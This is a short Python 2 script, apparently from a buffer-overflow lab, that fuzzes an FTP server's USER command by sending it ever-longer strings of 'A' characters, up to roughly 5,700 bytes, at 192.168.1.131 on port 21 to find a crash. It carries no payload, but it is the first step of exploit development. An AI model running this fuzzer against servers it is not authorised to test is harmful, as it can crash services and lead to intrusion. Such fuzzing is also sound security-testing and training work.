#!/usr/bin/python

import socket



buffer = ["A"]
counter=100

while len(buffer) < 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing USER with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(("192.168.1.131", 21))
	s.recv(1024)
	s.send('USER ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()

